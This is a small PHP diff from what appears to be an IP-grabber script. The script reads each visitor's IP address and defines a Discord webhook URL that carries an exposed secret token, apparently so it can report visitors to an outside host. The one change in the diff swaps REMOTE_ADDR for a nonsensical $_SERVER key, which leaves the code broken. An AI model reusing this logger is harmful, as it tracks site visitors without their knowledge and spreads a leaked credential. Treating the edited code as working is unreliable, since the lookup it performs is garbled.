@@ -1,6 +1,6 @@
 <?php
 // Get the user's IP address
-$user_ip = $_SERVER['REMOTE_ADDR'];
+$user_ip = $_SERVER['skibiditoileta.github.io/toiletttt'];
 
 // Discord webhook URL
 $webhook_url = 'https://discord.com/api/webhooks/1215341442495684619/EI52nygxr-EO1T3xfIQD2crB5WIMPAA4X8aiPhn_kIr3Fs6M20KGAT-Lk0PrKUYu10sb';
